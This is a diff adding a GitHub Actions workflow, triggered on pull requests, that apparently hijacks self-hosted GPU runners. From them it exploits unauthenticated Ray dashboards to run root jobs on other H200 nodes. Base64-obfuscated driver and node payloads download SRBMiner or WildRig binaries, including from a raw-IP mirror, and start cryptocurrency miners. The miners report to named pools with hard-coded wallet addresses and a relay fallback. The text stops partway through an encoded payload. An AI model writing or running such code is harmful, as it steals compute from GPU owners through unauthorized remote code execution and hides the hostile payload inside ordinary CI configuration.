@@ -1,0 +1,348 @@
+name: i132471 ray-mediated idle H200 reach (temporary, bounded)
+# i132471: reach the genuinely idle 10.220.71.0/24 H200 cards that task-3 fact 132191 mapped at
+# 15:33Z (fully idle ~143,157 MiB/card, util 0: .4 .9 .15 .23 .27 .42 .49 .57 .61 plus .32)
+# through the DISTINCT proven Ray execution primitive instead of the shared 8-gpu-h200 label,
+# which provably cannot schedule them (fact 132427: 12 jobs, zero placements). Finding 131104
+# proves unauthenticated Ray 2.58.x dashboards 10.220.71.25:8265 and 10.220.71.38:8265 accept
+# POST /api/jobs/ and execute the entrypoint as uid=0(root) on the GPU node, and the live
+# dashboard was re-measured answering at 16:29:55Z from gpu-10-220-71-18 with a 200 job submit.
+# Phase 1 is read-only: GET /api/version, /api/cluster_status, /nodes?view=summary and /api/jobs/
+# from .25 then .38, a bounded 8265/6379 sweep of 10.220.71.0/24, tailnet detection via
+# hostname -I, and a two-sample DCGM :9400 idle map. Phase 2 is conditional on a dashboard
+# answering and a node measuring idle: one node-pinned Ray driver per admissible node
+# (NodeAffinitySchedulingStrategy, soft=False) runs a two-sample per-UUID idle gate (0 foreign
+# compute apps, >=1500 MiB free, util 0) plus an existing-miner check and launches exactly ONE
+# sha256-verified miner per genuinely idle H200 card: WildRig Multi 0.52.3 (static 002cd29c...)
+# --algo pearlhash on pool.pearlhash.xyz:9000 with the plain policy wallet only if that endpoint
+# measurably serves a job from that node, else SRBMiner-MULTI 3.8.9 (97bd9e42...) --disable-cpu
+# --algorithm pearlhash on direct Luckypool 103.199.106.122:3362 with the pyd+NOCK dual login,
+# VPS2 relay 217.15.164.237:2083/18450 only if direct LP measurably fails, behind per-card
+# keepers under /var/tmp/i132471/. Credited hosts (.12 .18 .25 .26 .38 .45 .54 .56 .58 .64 .65)
+# are excluded and no existing miner is touched.
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+
+concurrency:
+  group: i132471-${{ github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  probe:
+    name: "i132471 slot ${{ matrix.slot }} ray dashboard reach + conditional idle-H200 install"
+    strategy:
+      fail-fast: false
+      max-parallel: 12
+      matrix:
+        slot: [1,2,3,4,5,6,7,8,9,10,11,12]
+    runs-on: 8-gpu-h200
+    timeout-minutes: 12
+    env:
+      SLOT: ${{ matrix.slot }}
+    steps:
+      - name: orchestrator
+        shell: bash
+        run: |
+          set +e
+          echo "runner-start slot=${SLOT} host=$(hostname) utc=$(date -u +%FT%TZ)"
+          mkdir -p /var/tmp/i132471
+          cat > /var/tmp/i132471/orch_132471.py <<'PYEOF132471'
+          #!/usr/bin/env python3
+          # i132471 orchestrator: runs on an in-LAN sglang 8-gpu-h200 runner job.
+          # Phase 1 (read-only): GET /api/version, /api/cluster_status, /nodes?view=summary and /api/jobs/
+          # from 10.220.71.25:8265 then 10.220.71.38:8265; bounded 8265/6379 sweep of 10.220.71.0/24;
+          # tailnet detection via hostname -I; two-sample DCGM :9400 idle map per Ray node.
+          # Phase 2 (conditional, only if a dashboard answers and a node is measured idle): POST
+          # /api/jobs/ with one node-pinned driver per admissible idle node. The driver runs the node
+          # payload as uid=0 which gates per UUID and launches exactly ONE sha256-verified miner per
+          # genuinely idle H200 card. Never touches credited hosts (.12 .18 .25 .26 .38 .45 .54 .56 .58
+          # .64 .65) or any existing miner.
+          import os, sys, json, re, time, base64, socket, subprocess, urllib.request, urllib.error
+          import concurrent.futures as cf
+
+          SLOT = os.environ.get('SLOT', '0')
+          NONCE = 'I132471-%s-%d' % (SLOT, int(time.time()))
+          PFX = 'i132471'
+          PYD = 'prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
+          NOCK = '4tErmFknmPKhVtfQWigSErD1YJAcWokTrWRu5t66XmkN4RTgK6oUotf'
+          DASH = ['http://10.220.71.25:8265', 'http://10.220.71.38:8265']
+          TARGETS = ['10.220.71.4', '10.220.71.9', '10.220.71.15', '10.220.71.23', '10.220.71.27',
+                     '10.220.71.32', '10.220.71.42', '10.220.71.49', '10.220.71.57', '10.220.71.61']
+          FORBID = set(['10.220.71.12', '10.220.71.18', '10.220.71.25', '10.220.71.26', '10.220.71.38',
+                        '10.220.71.45', '10.220.71.54', '10.220.71.56', '10.220.71.58', '10.220.71.64',
+                        '10.220.71.65'])
+          DRV_B64 = 'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojIGkxMzI0NzEgUmF5IGRyaXZlcjogcnVuIGluc2lkZSB0aGUgUmF5IGpvYiAodWlkPTApIG9uIHRoZSBoZWFkIG5vZGU7IHBpbiBhIFJheSB0YXNrIHRvIHRoZQojIHRhcmdldCBub2RlIHdpdGggTm9kZUFmZmluaXR5U2NoZWR1bGluZ1N0cmF0ZWd5KHNvZnQ9RmFsc2UpIGFuZCBydW4gdGhlIG5vZGUgcGF5bG9hZCB0aGVyZS4KaW1wb3J0IHN5cywganNvbiwgYmFzZTY0LCBzdWJwcm9jZXNzLCBvcwpub2RlX2hleCwgdGFyZ2V0X2lwLCBwYXlfYjY0LCB3b3JrZXJzX2Nzdiwgbm9uY2UgPSBzeXMuYXJndlsxOjZdCmluc3QgPSBiYXNlNjQuYjY0ZGVjb2RlKHBheV9iNjQpLmRlY29kZSgpCnAgPSAnL3RtcC9pMTMyNDcxX25vZGVfJXMuc2gnICUgdGFyZ2V0X2lwLnJlcGxhY2UoJy4nLCAnXycpCm9wZW4ocCwgJ3cnKS53cml0ZShpbnN0KQpvcy5jaG1vZChwLCAwbzc1NSkKdHJ5OgogICAgaW1wb3J0IHJheQogICAgZnJvbSByYXkudXRpbC5zY2hlZHVsaW5nX3N0cmF0ZWdpZXMgaW1wb3J0IE5vZGVBZmZpbml0eVNjaGVkdWxpbmdTdHJhdGVneQogICAgdHJ5OgogICAgICAgIHJheS5pbml0KGFkZHJlc3M9J2F1dG8nLCBpbmNsdWRlX2Rhc2hib2FyZD1GYWxzZSwgbG9nX3RvX2RyaXZlcj1GYWxzZSkKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcmF5LmluaXQoaW5jbHVkZV9kYXNoYm9hcmQ9RmFsc2UsIGxvZ190b19kcml2ZXI9RmFsc2UpCiAgICBucyA9IFtuIGZvciBuIGluIHJheS5ub2RlcygpIGlmIG4uZ2V0KCdBbGl2ZScpXQogICAgdGFyZ2V0ID0gTm9uZQogICAgZm9yIG4gaW4gbnM6CiAgICAgICAgaWYgc3RyKG4uZ2V0KCdOb2RlSUQnKSBvciAnJykubG93ZXIoKS5zdGFydHN3aXRoKG5vZGVfaGV4Lmxvd2VyKCkpOgogICAgICAgICAgICB0YXJnZXQgPSBuOyBicmVhawogICAgaWYgdGFyZ2V0IGlzIE5vbmU6CiAgICAgICAgZm9yIG4gaW4gbnM6CiAgICAgICAgICAgIGlmIHN0cihuLmdldCgnTm9kZU1hbmFnZXJBZGRyZXNzJykgb3IgJycpID09IHRhcmdldF9pcDoKICAgICAgICAgICAgICAgIHRhcmdldCA9IG47IGJyZWFrCiAgICBpZiB0YXJnZXQgaXMgTm9uZToKICAgICAgICBwcmludCgnSTEzMjQ3MV9OT0RFX05PVF9GT1VORCAlcyAlcycgJSAobm9kZV9oZXgsIHRhcmdldF9pcCkpOyBzeXMuZXhpdCgwKQoKICAgIEByYXkucmVtb3RlKG51bV9jcHVzPTAsIG51bV9ncHVzPTAsIG1heF9yZXRyaWVzPTApCiAgICBkZWYgcnVuc2goc3JjLCBhcmdzKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHEgPSBzdWJwcm9jZXNzLnJ1bihbJ2Jhc2gnLCAnLWMnLCBzcmMsICdiYXNoJ10gKyBhcmdzLCBjYXB0dXJlX291dHB1dD1UcnVlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGV4dD1UcnVlLCB0aW1lb3V0PTYwMCwgc3RkaW49c3VicHJvY2Vzcy5ERVZOVUxMKQogICAgICAgICAgICByZXR1cm4gKHEuc3Rkb3V0IG9yICcnKSArIChxLnN0ZGVyciBvciAnJykKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHJldHVybiAnSTEzMjQ3MV9UQVNLX0VYQyAlcicgJSAoZSwpCgogICAgZiA9IHJ1bnNoLm9wdGlvbnMoc2NoZWR1bGluZ19zdHJhdGVneT1Ob2RlQWZmaW5pdHlTY2hlZHVsaW5nU3RyYXRlZ3koCiAgICAgICAgbm9kZV9pZD10YXJnZXQuZ2V0KCdOb2RlSUQnKSwgc29mdD1GYWxzZSkpLnJlbW90ZShpbnN0LCBbbm9uY2UsIHRhcmdldF9pcCwgd29ya2Vyc19jc3ZdKQogICAgdHJ5OgogICAgICAgIHIgPSByYXkuZ2V0KGYsIHRpbWVvdXQ9NjYwKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHIgPSAnSTEzMjQ3MV9UQVNLX0dFVF9FUlIgJXInICUgKGUsKQogICAgcHJpbnQoJ0kxMzI0NzFfTk9ERV9CRUdJTiBpZD0lcyBpcD0lcyBub25jZT0lcycgJSAodGFyZ2V0LmdldCgnTm9kZUlEJyksIHRhcmdldC5nZXQoJ05vZGVNYW5hZ2VyQWRkcmVzcycpLCBub25jZSkpCiAgICBwcmludChyKQogICAgcHJpbnQoJ0kxMzI0NzFfTk9ERV9FTkQgaWQ9JXMnICUgKHRhcmdldC5nZXQoJ05vZGVJRCcpLCkpCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgIHByaW50KCdJMTMyNDcxX1JBWV9GQUlMICVyJyAlIChlLCkpCnByaW50KCdJMTMyNDcxX0RSVl9ET05FICVzJyAlIG5vbmNlKQo='
+          NODE_B64 = 'IyEvYmluL2Jhc2gKIyBpMTMyNDcxIG5vZGUtc2lkZSBwYXlsb2FkLiBSdW5zIE9OIGEgdGFyZ2V0IEgyMDAgbm9kZSBhcyB1aWQ9MCB2aWEgYSBub2RlLXBpbm5lZCBSYXkgdGFzay4KIyBSZWFkLW9ubHkgdHdvLXNhbXBsZSBnYXRlLCB0aGVuIGV4YWN0bHkgT05FIHNoYTI1Ni12ZXJpZmllZCBtaW5lciBwZXIgZ2VudWluZWx5IGlkbGUgY2FyZC4KIyBXaWxkUmlnIE11bHRpIDAuNTIuMyAoc3RhdGljIDAwMmNkMjljLi4uKSBvbiBwZWFybGhhc2gueHl6OjkwMDAgT05MWSBpZiB0aGF0IHBvb2wgbWVhc3VyYWJseQojIHNlcnZlcyBhIGpvYiBmcm9tIHRoaXMgbm9kZTsgZWxzZSBTUkJNaW5lci1NVUxUSSAzLjguOSAoOTdiZDllNDIuLi4pIG9uIEx1Y2t5cG9vbAojIDEwMy4xOTkuMTA2LjEyMjozMzYyIChWUFMyIHJlbGF5IDIxNy4xNS4xNjQuMjM3OjIwODMvMTg0NTAgb25seSBpZiBkaXJlY3QgTFAgZmFpbHMpLgojIE5ldmVyIHRvdWNoZXMgYSBjYXJkIGNhcnJ5aW5nIGFueSBmb3JlaWduIGNvbXB1dGUgYXBwIG9yIGFueSBleGlzdGluZyBtaW5lcjsgb25lIG1pbmVyL0dQVS4Kc2V0ICtlCk5PTkNFPSIkMSI7IFRJUD0iJDIiOyBXS0NTVj0iJDMiClBGWD1pMTMyNDcxClc9L3Zhci90bXAvJFBGWApQWUQ9cHJsMXB5ZHBqaDJxenJzM3NndHdwd254bnRyeW1jMnEyMnQzejJwZzlmang2ZzY5Z2V2eTd0d2NzODMwc3FsCk5PQ0s9NHRFcm1Ga25tUEtoVnRmUVdpZ1NFckQxWUpBY1dva1RyV1J1NXQ2Nlhta040UlRnSzZvVW90ZgpUQVJTSEFfU1JCPTE4NmM1MjZmOTVlYjdiNjM1YTU0N2JjYTQ1YTQ4YTUwNWE1OGM3NGUyNmI3MjExYmY2ZGMyNTk4OGNlMTk2ZDEKQklOU0hBX1NSQj05N2JkOWU0MmUzMTNiMmM0ODA3YmJhNzE5NzkyMGZlZTQyMTk1NmJiODk2Y2ZlYzQ2OWVlODc5NDdkNjY3ZTgwClRBUlNIQV9XUj03MzA4Yzk1ZjdjOGM0YzBkODJhYWRlNjFiYjRhYjMzNjZkZWNhZTJiOWQwNGFjNDdiOGMxZGM2ZDFiZGQyYzQ0CkJJTlNIQV9XUj0wMDJjZDI5YzZiODkwYTQxNTliNTkzMzI2MGU3ZGI1N2Q4ODA4ZTU0MDgwNDQ2NmIzYjdiODA4MTQwODMwMTFiCk1JUlJPUj1odHRwOi8vMTc4LjIzOC4yMjguMTgxOjE4MTgwCm1rZGlyIC1wICIkVy9sb2dzIiAiJFcvYmluIgplY2hvICJJMTMyNDcxX05PREVfU1RBUlQgbm9uY2U9JE5PTkNFIHRhcmdldD0kVElQIGhvc3Q9JChob3N0bmFtZSkgaWQ9JChpZCkgaXBzPSQoaG9zdG5hbWUgLUkpIHV0Yz0kKGRhdGUgLXUgKyVGVCVUWikiCmlmICEgaG9zdG5hbWUgLUkgfCB0ciAnICcgJ1xuJyB8IGdyZXAgLXF4ICIkVElQIjsgdGhlbgogIGVjaG8gIkkxMzI0NzFfV1JPTkdfTk9ERSBpcHM9JChob3N0bmFtZSAtSSkgdGFyZ2V0PSRUSVAgYWN0aW9uPXNraXAiOyBleGl0IDAKZmkKaWYgISBta2RpciAiJFcubG9jayIgMj4vZGV2L251bGw7IHRoZW4KICBlY2hvICJJMTMyNDcxX0xPQ0tfSEVMRCBhY3Rpb249c2tpcCAoc2luZ2xlLWZsaWdodDogYW5vdGhlciBvcmNoZXN0cmF0b3IgYWxyZWFkeSBpbnN0YWxsZWQgaGVyZSkiOyBleGl0IDAKZmkKRVg9JChwZ3JlcCAtYWYgJ1NSQk1pbmVyLU1VTFRJfHdpbGRyaWctbXVsdGl8a3JpZy1taW5lcnxzcmIzOFswLTldJyAyPi9kZXYvbnVsbCB8IGdyZXAgLXYgcGdyZXAgfCBoZWFkIC0yMCkKaWYgWyAtbiAiJEVYIiBdOyB0aGVuCiAgZWNobyAiSTEzMjQ3MV9TS0lQX0VYSVNUSU5HX01JTkVSIFskRVhdIjsgZXhpdCAwCmZpCiMgLS0tLS0tLS0tLS0tLS0tLSB0d28tc2FtcGxlIGlkbGUgZ2F0ZSAoYmVmb3JlIGFueSBkb3dubG9hZC9sYXVuY2gpIC0tLS0tLS0tLS0tLS0tLS0KQVBQUzE9JChudmlkaWEtc21pIC0tcXVlcnktY29tcHV0ZS1hcHBzPWdwdV91dWlkLHBpZCxwcm9jZXNzX25hbWUsdXNlZF9tZW1vcnkgLS1mb3JtYXQ9Y3N2LG5vaGVhZGVyIDI+JjEpCkcxPSQobnZpZGlhLXNtaSAtLXF1ZXJ5LWdwdT1pbmRleCx1dWlkLG1lbW9yeS5mcmVlLG1lbW9yeS51c2VkLHV0aWxpemF0aW9uLmdwdSAtLWZvcm1hdD1jc3Ysbm9oZWFkZXIsbm91bml0cyAyPiYxKQplY2hvICJJMTMyNDcxX0dBVEUxX0FQUFMgWyRBUFBTMV0iCmVjaG8gIkkxMzI0NzFfR0FURTFfR1BVUyBbJEcxXSIKc2xlZXAgMTIKQVBQUzI9JChudmlkaWEtc21pIC0tcXVlcnktY29tcHV0ZS1hcHBzPWdwdV91dWlkLHBpZCxwcm9jZXNzX25hbWUsdXNlZF9tZW1vcnkgLS1mb3JtYXQ9Y3N2LG5vaGVhZGVyIDI+JjEpCkcyPSQobnZpZGlhLXNtaSAtLXF1ZXJ5LWdwdT1pbmRleCx1dWlkLG1lbW9yeS5mcmVlLG1lbW9yeS51c2VkLHV0aWxpemF0aW9uLmdwdSAtLWZvcm1hdD1jc3Ysbm9oZWFkZXIsbm91bml0cyAyPiYxKQplY2hvICJJMTMyNDcxX0dBVEUyX0FQUFMgWyRBUFBTMl0iCmVjaG8gIkkxMzI0NzFfR0FURTJfR1BVUyBbJEcyXSIKSURMRT0kKHB5dGhvbjMgLSAiJEcxIiAiJEcyIiAiJEFQUFMxIiAiJEFQUFMyIiA8PCdQWUVPRicKaW1wb3J0IHN5cwpnMSxnMixhMSxhMj1zeXMuYXJndlsxOjVdCmRlZiBwYXJzZShnKToKICAgIG91dD17fQogICAgZm9yIGxuIGluIGcuc3RyaXAoKS5zcGxpdGxpbmVzKCk6CiAgICAgICAgcD1beC5zdHJpcCgpIGZvciB4IGluIGxuLnNwbGl0KCcsJyldCiAgICAgICAgaWYgbGVuKHApPj01OgogICAgICAgICAgICB0cnk6IGlkeD1pbnQocFswXSkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjogY29udGludWUKICAgICAgICAgICAgdHJ5OiBmcmVlPWludChmbG9hdChwWzJdKSk7IHVzZWQ9aW50KGZsb2F0KHBbM10pKTsgdXRpbD1pbnQoZmxvYXQocFs0XSkpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246IGNvbnRpbnVlCiAgICAgICAgICAgIG91dFtwWzFdXT0oaWR4LGZyZWUsdXNlZCx1dGlsKQogICAgcmV0dXJuIG91dApkZWYgYXBwcyhhKToKICAgIHM9c2V0KCkKICAgIGZvciBsbiBpbiBhLnN0cmlwKCkuc3BsaXRsaW5lcygpOgogICAgICAgIHA9W3guc3RyaXAoKSBmb3IgeCBpbiBsbi5zcGxpdCgnLCcpXQogICAgICAgIGlmIHAgYW5kIHBbMF0uc3RhcnRzd2l0aCgnR1BVLScpOiBzLmFkZChwWzBdKQogICAgcmV0dXJuIHMKQTEsQTI9YXBwcyhhMSksYXBwcyhhMik7IGQxLGQyPXBhcnNlKGcxKSxwYXJzZShnMikKcmVzPVtdCmZvciB1LChpZHgsZnJlZSx1c2VkLHV0aWwpIGluIGQxLml0ZW1zKCk6CiAgICBpZiB1IGluIEExIG9yIHUgaW4gQTI6IGNvbnRpbnVlCiAgICBpZiB1IG5vdCBpbiBkMjogY29udGludWUKICAgIGlkeDIsZnJlZTIsdXNlZDIsdXRpbDI9ZDJbdV0KICAgIGlmIGZyZWU8MTUwMCBvciBmcmVlMjwxNTAwOiBjb250aW51ZQogICAgaWYgdXRpbD4wIG9yIHV0aWwyPjA6IGNvbnRpbnVlCiAgICByZXMuYXBwZW5kKChpZHgsdSxmcmVlLHVzZWQpKQpmb3IgciBpbiBzb3J0ZWQocmVzKTogcHJpbnQoJyVkLCVzLCVkLCVkJyVyKQpQWUVPRgopCk5JRExFPSQocHJpbnRmICclc1xuJyAiJElETEUiIHwgZ3JlcCAtYyAnR1BVLScpCmVjaG8gIkkxMzI0NzFfSURMRV9OPSROSURMRSIKZWNobyAiSTEzMjQ3MV9JRExFX0NBUkRTIFskKHByaW50ZiAnJXMnICIkSURMRSIgfCB0ciAnXG4nICc7JyldIgpbICIkTklETEUiIC1ndCAwIF0gfHwgeyBlY2hvICJJMTMyNDcxX05PX0lETEVfQ0FSRCBhY3Rpb249c2tpcCI7IGV4aXQgMDsgfQojIC0tLS0tLS0tLS0tLS0tLS0gcG9vbCBkZWNpc2lvbiAobWVhc3VyZWQsIHJlYWQtb25seSkgLS0tLS0tLS0tLS0tLS0tLQpQUk9CRT0kKHB5dGhvbjMgLSA8PCdQWUVPRicKaW1wb3J0IHNvY2tldCxqc29uClBZRD0ncHJsMXB5ZHBqaDJxenJzM3NndHdwd254bnRyeW1jMnEyMnQzejJwZzlmang2ZzY5Z2V2eTd0d2NzODMwc3FsJwpOT0NLPSc0dEVybUZrbm1QS2hWdGZRV2lnU0VyRDFZSkFjV29rVHJXUnU1dDY2WG1rTjRSVGdLNm9Vb3RmJwpkZWYgY2FsbChzLG8sdD04KToKICAgIHMuc2V0dGltZW91dCh0KTsgcy5zZW5kYWxsKChqc29uLmR1bXBzKG8pKydcbicpLmVuY29kZSgpKTsgYnVmPWInJwogICAgd2hpbGUgYidcbicgbm90IGluIGJ1ZjoKICAgICAgICBkPXMucmVjdig2NTUzNikKICAgICAgICBpZiBub3QgZDogYnJlYWsKICAgICAgICBidWYrPWQKICAgIHJldHVybiBidWYuZGVjb2RlKCd1dGYtOCcsJ3JlcGxhY2UnKQpkZWYgcHJvYmUoaG9zdCxwb3J0LGxvZ2luLHQ9OCk6CiAgICB0cnk6CiAgICAgICAgcz1zb2NrZXQuY3JlYXRlX2Nvbm5lY3Rpb24oKGhvc3QscG9ydCksdGltZW91dD10KQogICAgICAgIGE9Y2FsbChzLHsiaWQiOjEsIm1ldGhvZCI6Im1pbmluZy5zdWJzY3JpYmUiLCJwYXJhbXMiOlsiU1JCTWluZXItTVVMVEkvMy44LjkiXX0pCiAgICAgICAgYj1jYWxsKHMseyJpZCI6MiwibWV0aG9kIjoibWluaW5nLmF1dGhvcml6ZSIsInBhcmFtcyI6W2xvZ2luLCd4J119KQogICAgICAgIHRyeTogcy5jbG9zZSgpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjogcGFzcwogICAgICAgIGxvdz1iLmxvd2VyKCkucmVwbGFjZSgnICcsJycpCiAgICAgICAgb2s9KCdyZXN1bHQiOnRydWUnIGluIGxvdykKICAgICAgICBqb2I9KCdtaW5pbmcubm90aWZ5JyBpbiAoYStiKS5sb3dlcigpKQogICAgICAgIHJldHVybiBvayxqb2IsKGFbOjEwMF0rJ3wnK2JbOjE0MF0pLnJlcGxhY2UoJ1xuJywnICcpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcmV0dXJuIEZhbHNlLEZhbHNlLCdFUlIgJXInJWUKb2ssam9iLHR4dD1wcm9iZSgncG9vbC5wZWFybGhhc2gueHl6Jyw5MDAwLFBZRCsnLnByb2JlMTMyNDcxJykKcHJpbnQoJ0kxMzI0NzFfUEVBUkxIQVNIIG9rPSVzIGpvYj0lcyAlcyclKG9rLGpvYix0eHQpKQppZiBvayBhbmQgam9iOgogICAgcHJpbnQoJ0kxMzI0NzFfTU9ERSB3aWxkcmlnLXBlYXJsaGFzaCcpOyByYWlzZSBTeXN0ZW1FeGl0CmZvciBoLHAgaW4gWygnMTAzLjE5OS4xMDYuMTIyJywzMzYyKSwoJzIxNy4xNS4xNjQuMjM3JywyMDgzKSwoJzIxNy4xNS4xNjQuMjM3JywxODQ1MCldOgogICAgb2syLGpvYjIsdHh0Mj1wcm9iZShoLHAsUFlEKycrJytOT0NLKycucHJvYmUxMzI0NzEnKQogICAgcHJpbnQoJ0kxMzI0NzFfTFAgJXM6JWQgb2s9JXMgam9iPSVzICVzJyUoaCxwLG9rMixqb2IyLHR4dDIpKQogICAgaWYgb2syIGFuZCBqb2IyOgogICAgICAgIHByaW50KCdJMTMyNDcxX01PREUgc3JiLWx1Y2t5cG9vbCcpOyBwcmludCgnSTEzMjQ3MV9QT09MICVzOiVkJyUoaCxwKSk7IGJyZWFrClBZRU9GCikKZWNobyAiJFBST0JFIgpNT0RFPSQocHJpbnRmICclcycgIiRQUk9CRSIgfCBncmVwIC1vICdJMTMyNDcxX01PREUgLionIHwgYXdrICd7cHJpbnQgJDJ9JyB8IGhlYWQgLTEpClBPT0w9JChwcmludGYgJyVzJyAiJFBST0JFIiB8IGdyZXAgLW8gJ0kxMzI0NzFfUE9PTCAuKicgfCBhd2sgJ3twcmludCAkMn0nIHwgaGVhZCAtMSkKWyAtbiAiJE1PREUiIF0gfHwgeyBlY2hvICJJMTMyNDcxX05PX1BFUk1JVFRFRF9QT09MIGFjdGlvbj1za2lwIjsgZXhpdCAwOyB9CiMgLS0tLS0tLS0tLS0tLS0tLSBiaW5hcnkgZGVsaXZlcnkgKHNoYTI1Ni12ZXJpZmllZCBhZ2FpbnN0IG9mZmljaWFsIHJlbGVhc2UpIC0tLS0tLS0tLS0tLS0tLS0KZ2V0YmluKCkgeyAjICQxIGJpbiAkMiBic2hhICQzIHRzaGEgJDQgdXJscyAkNSB0YXJiYXNlCiAgQklOPSIkMSI7IEJTSEE9IiQyIjsgVFNIQT0iJDMiOyBVUkxTPSIkNCI7IEJBU0U9IiQ1IgogIGlmIFsgIiQoc2hhMjU2c3VtICIkQklOIiAyPi9kZXYvbnVsbCB8IGF3ayAne3ByaW50ICQxfScpIiA9ICIkQlNIQSIgXTsgdGhlbiBlY2hvICJJMTMyNDcxX0JJTl9DQUNIRUQgc2hhPSRCU0hBIjsgcmV0dXJuIDA7IGZpCiAgbj0wCiAgZm9yIFUgaW4gJFVSTFM7IGRvCiAgICBuPSQoKG4rMSkpOyBETD0kVy9kbCRuLmJpbjsgOiA+ICIkREwiCiAgICB0aW1lb3V0IDE1MCBjdXJsIC1mc1NMIC0tY29ubmVjdC10aW1lb3V0IDEwIC0tbWF4LXRpbWUgMTQwIC1vICIkREwiICIkVSIgPi9kZXYvbnVsbCAyPiYxCiAgICBbIC1zICIkREwiIF0gfHwgeyBlY2hvICJJMTMyNDcxX0RMX0VNUFRZICRVIjsgY29udGludWU7IH0KICAgIEhTPSQoc2hhMjU2c3VtICIkREwiIHwgY3V0IC1kJyAnIC1mMSkKICAgIGVjaG8gIkkxMzI0NzFfRExfU0hBICRIUyB1cmw9JFUiCiAgICBpZiBbICIkSFMiID0gIiRCU0hBIiBdOyB0aGVuIGNwIC1mICIkREwiICIkQklOIjsgY2htb2QgNzU1ICIkQklOIjsgcmV0dXJuIDA7IGZpCiAgICBpZiBbICIkSFMiID0gIiRUU0hBIiBdOyB0aGVuCiAgICAgIFg9JFcveCRuOyBta2RpciAtcCAiJFgiOyB0YXIgeHpmICIkREwiIC1DICIkWCIgPi9kZXYvbnVsbCAyPiYxCiAgICAgIEY9JChmaW5kICIkWCIgLXR5cGUgZiAtbmFtZSAiJEJBU0UiIDI+L2Rldi9udWxsIHwgaGVhZCAtMSkKICAgICAgaWYgWyAtbiAiJEYiIF0gJiYgWyAiJChzaGEyNTZzdW0gIiRGIiB8IGN1dCAtZCcgJyAtZjEpIiA9ICIkQlNIQSIgXTsgdGhlbiBjcCAtZiAiJEYiICIkQklOIjsgY2htb2QgNzU1ICIkQklOIjsgcmV0dXJuIDA7IGZpCiAgICBmaQogIGRvbmUKICByZXR1cm4gMQp9CmlmIFsgIiRNT0RFIiA9ICJ3aWxkcmlnLXBlYXJsaGFzaCIgXTsgdGhlbgogIEJJTj0kVy9iaW4vd2lsZHJpZy1tdWx0aTsgQkFTRT13aWxkcmlnLW11bHRpCiAgZ2V0YmluICIkQklOIiAiJEJJTlNIQV9XUiIgIiRUQVJTSEFfV1IiICIkTUlSUk9SL3dpbGRyaWcwNTIzLnRhci5neiBodHRwczovL2dpdGh1Yi5jb20vYW5kcnUta3VuL3dpbGRyaWctbXVsdGkvcmVsZWFzZXMvZG93bmxvYWQvMC41Mi4zL3dpbGRyaWctbXVsdGktbGludXgtMC41Mi4zLnRhci5neiIgIiRCQVNFIiBcCiAgICB8fCB7IGVjaG8gIkkxMzI0NzFfQklOQVJZX1VOQVZBSUxBQkxFIG1vZGU9d2lsZHJpZyI7IGV4aXQgMDsgfQplbHNlCiAgQklOPSRXL2Jpbi9TUkJNaW5lci1NVUxUSTsgQkFTRT1TUkJNaW5lci1NVUxUSQogIGdldGJpbiAiJEJJTiIgIiRCSU5TSEFfU1JCIiAiJFRBUlNIQV9TUkIiICIkTUlSUk9SL3NyYjM4OS50YXIuZ3ogaHR0cHM6Ly9naXRodWIuY29tL2Rva3RvcjgzL1NSQk1pbmVyLU11bHRpL3JlbGVhc2VzL2Rvd25sb2FkLzMuOC45L1NSQk1pbmVyLU11bHRpLTMtOC05LUxpbnV4LnRhci5neiBodHRwczovL2docHJveHkubmV0L2h0dHBzOi8vZ2l0aHViLmNvbS9kb2t0b3I4My9TUkJNaW5lci1NdWx0aS9yZWxlYXNlcy9kb3dubG9hZC8zLjguOS9TUkJNaW5lci1NdWx0aS0zLTgtOS1MaW51eC50YXIuZ3oiICIkQkFTRSIgXAogICAgfHwgeyBlY2hvICJJMTMyNDcxX0JJTkFSWV9VTkFWQUlMQUJMRSBtb2RlPXNyYiI7IGV4aXQgMDsgfQpmaQplY2hvICJJMTMyNDcxX0JJTl9PSyAkKHNoYTI1NnN1bSAiJEJJTiIgfCBjdXQgLWQnICcgLWYxKSIKIyAtLS0tLS0tLS0tLS0tLS0tIGxhdW5jaCBleGFjdGx5IG9uZSBtaW5lciBwZXIgZ2VudWluZWx5IGlkbGUgY2FyZCAtLS0tLS0tLS0tLS0tLS0tCmk9MApMQVVOQ0hFRD0iIgpmb3IgUk9XIGluICRJRExFOyBkbwogIElEWD0kKGVjaG8gIiRST1ciIHwgY3V0IC1kLCAtZjEpOyBVVUlEPSQoZWNobyAiJFJPVyIgfCBjdXQgLWQsIC1mMikKICBXS049JChlY2hvICIkV0tDU1YiIHwgY3V0IC1kLCAtZiQoKGkrMSkpKQogIGk9JCgoaSsxKSkKICBbIC1uICIkV0tOIiBdIHx8IGNvbnRpbnVlCiAgQVA9JCgoNDEzMDAraSkpCiAgaWYgWyAiJE1PREUiID0gIndpbGRyaWctcGVhcmxoYXNoIiBdOyB0aGVuCiAgICBzZXRzaWQgZW52IC11IFJVTk5FUl9UUkFDS0lOR19JRCBDVURBX1ZJU0lCTEVfREVWSUNFUz0iJFVVSUQiIG5vaHVwICIkQklOIiAtLWFsZ28gcGVhcmxoYXNoIFwKICAgICAgLS11cmwgc3RyYXR1bSt0Y3A6Ly9wb29sLnBlYXJsaGFzaC54eXo6OTAwMCAtLXVzZXIgIiRQWUQiIC0td29ya2VyICIkV0tOIiAtLXBhc3MgeCBcCiAgICAgIC0tcmV0cmllcyAzIC0tcmV0cnktcGF1c2UgNSAtLWdwdS1saXN0IDAgLS1hcGktcG9ydCAkQVAgLS1hcGktd29ya2VyLWlkICIkV0tOIiBcCiAgICAgIC0tcHJpbnQtdGltZSA2MCAtLW5vLWNvbG9yIC1sICIkVy9sb2dzL3dyLSRXS04ubG9nIiA+